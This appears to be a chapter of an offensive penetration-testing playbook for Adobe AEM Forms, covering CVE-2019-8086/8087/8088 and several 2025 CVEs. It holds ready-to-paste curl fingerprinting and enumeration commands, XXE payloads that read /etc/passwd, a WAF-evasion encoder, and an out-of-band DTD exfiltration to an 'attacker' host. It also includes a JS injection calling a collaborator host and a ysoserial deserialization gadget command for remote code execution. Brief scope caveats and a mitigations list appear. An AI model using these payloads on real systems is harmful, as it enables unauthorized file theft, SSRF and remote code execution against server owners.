# 8 — AEM Forms (Egorov 2020 + Shah / Assetnote 2025)

**AEM Forms** ≠ basic AEM sites.  
It is the **forms / LiveCycle** product family.  
Can ride with AEM **or** stand alone on JBoss/J2EE.

If fingerprint hits Forms paths → this file. Else skip.

---

## Fingerprint (again)

```bash
T="https://TARGET"

curl -sk -o /dev/null -w "%{http_code} login\n" "$T/lc/libs/livecycle/core/content/login.html"
curl -sk -o /dev/null -w "%{http_code} edcws\n" "$T/edcws/"
curl -sk -o /dev/null -w "%{http_code} adminui\n" "$T/adminui/"
curl -sk -o /dev/null -w "%{http_code} FormServer\n" "$T/FormServer/"
curl -sk -o /dev/null -w "%{http_code} guide\n" "$T/content/forms/af/"
```

---

# Part A — Classic Forms guide XXE / JS (Egorov, adapt.to 2020, APSB19-48)

Source PDF:  
https://adapt.to/2020/presentations/adaptto2020-a-hackers-perspective-on-aem-applications-security-mikhail-egorov.pdf

### Kid-level idea

Some form components accept **XML**.  
Bad XML parsers → **XXE** (read files / SSRF).  
Some accept **JavaScript-ish** fields → injection.

### Requirements Egorov listed (important)

You often need:

1. A node with resource type  
   `fd/af/components/guideContainer`
2. Somewhere you can **write** a node (jcr:write), e.g. historical:  
   `/content/usergenerated/etc/commerce/smartlists/`  
3. Version-dependent behavior (RCE vs blind SSRF)

Find guide containers:

```bash
QB="https://TARGET/bin/querybuilder.json"  # or bypass
curl -sk -G "$QB" \
  --data-urlencode "property=sling:resourceType" \
  --data-urlencode "property.value=fd/af/components/guideContainer" \
  --data-urlencode "p.limit=20"
```

### CVE-2019-8086 — GuideInternalSubmitServlet XXE

Selector family: `af.internalsubmit` on guideContainer (POST).

**XXE payload shape:**

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE afData [
<!ENTITY a SYSTEM "file:///etc/passwd">
]>
<afData>&a;</afData>
```

**WAF dodge:** JSON-unicode escape the whole XML string (Egorov tip).

```python
data = '''<?xml version="1.0" encoding="utf-8"?><!DOCTYPE afData [<!ENTITY a SYSTEM "file:///etc/passwd">]><afData>&a;</afData>'''
print(''.join('\\u%04x' % ord(c) for c in data))
```

**Java XXE bonus:** `file:///etc` can **list directories**.  
Also try `file:///proc/self/cwd`.

Blind SSRF shape on some versions:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE afData SYSTEM "http://YOUR-COLLABORATOR/" []>
<afData></afData>
```

### CVE-2019-8087 — WSDLInvokerServlet XXE

Selector: `af.wsdl` (POST).  
Pulls remote WSDL; attacker WSDL loads external DTD → OOB XXE.

**Malicious WSDL idea:**

```xml
<?xml version="1.0"?>
<!DOCTYPE definitions [
<!ENTITY % dtd SYSTEM "http://attacker:1337/loot.dtd">
%dtd;
%param1;
]>
<!-- ... soap bits using &internal; ... -->
```

**loot.dtd:**

```xml
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY internal '%payload;'>">
```

### CVE-2019-8088 — GuideSubmitServlet JS injection

Selectors: `af.submit`, `af.agreement`, `af.signSubmit`.  
JS payload into fields → on some versions **RCE**, on others **sandboxed Rhino** → SSRF with response.

Example OOB style from talk:

```text
');jQuery.get('http://YOUR-COLLABORATOR');//
```

---

### Mitigations Egorov stressed (for reports / hardening notes)

- Patch APSB19-48 and later  
- Block anonymous **jcr:write** on user-generated paths  
- Remove demo content (Geometrixx, We.Retail, …)

---

# Part B — Modern standalone Forms RCE/XXE (Shah / Kues 2025)

Source:  
https://slcyber.io/research-center/struts-devmode-in-2025-critical-pre-auth-vulnerabilities-in-adobe-experience-manager-forms/

**Focus:** Standalone AEM Forms on JEE (e.g. JBoss).  
Internet-facing Forms = high priority.

| ID | Issue | Notes |
|----|--------|------|
| CVE-2025-49533 | Insecure deserialization RCE | `GetDocumentServlet` `serDoc` param |
| CVE-2025-54253 | Auth bypass + Struts2 **devMode** → OGNL RCE | `/adminui` filter bypass + devMode true |
| CVE-2025-54254 | XXE in Forms web services | |

### Paste kit — FormServer deserialization (high level)

Research path:

```text
/FormServer/servlet/GetDocumentServlet?serDoc=<gzip+base64 java serialized gadget>
```

Gadget generation concept (lab only, authorized):

```bash
# Research used CommonsBeanutils1 with properXalan=true, then gzip | base64
java -DproperXalan=true -jar ysoserial-all.jar CommonsBeanutils1 "id" \
  | gzip | base64 -w0
# Send as serDoc (URL-encoded). Prefer OOB/DNS in real tests.
```

### Paste kit — adminui / Struts devMode signals

```bash
T="https://TARGET"
curl -sk -o /dev/null -w "%{http_code}\n" "$T/adminui/"
curl -sk -o /dev/null -w "%{http_code}\n" "$T/adminui/login.do"
# If adminui reachable pre-auth historically → escalate carefully per latest patch status
```

**Why devastating:** Auth filter bypass + `struts.devMode=true` left in shipping config → OGNL eval.

### Paste kit — web services surface

```bash
curl -sk "$T/edcws/" | head -c 500
# Enumerate exposed SOAP/XML endpoints; test XXE only in scope with OOB first
```

---

## Operator order for Forms

```text
1) Fingerprint Forms vs normal AEM
2) Is it standalone JEE? (JBoss-ish paths, /FormServer, /adminui)
3) Try modern criticals only if version/patch unknown and scope allows RCE tests
4) If co-deployed with AEM Sites: also run normal AEM loot (04–07)
5) For older guideContainer: only if write+node requirements met
```

---

## Variations

| Time | Do |
|------|-----|
| 10 min | Fingerprint + adminui/FormServer status codes |
| 30 min | Package XXE/deser checks if standalone + in scope |
| No RCE allowed | Stop at unauth endpoint exposure + version |

---

## Done when

- [ ] Forms presence documented  
- [ ] Critical unauth surfaces tested or explicitly out of scope  
- [ ] No live shells left behind  

**Next:** [09-modern-bugs.md](./09-modern-bugs.md)
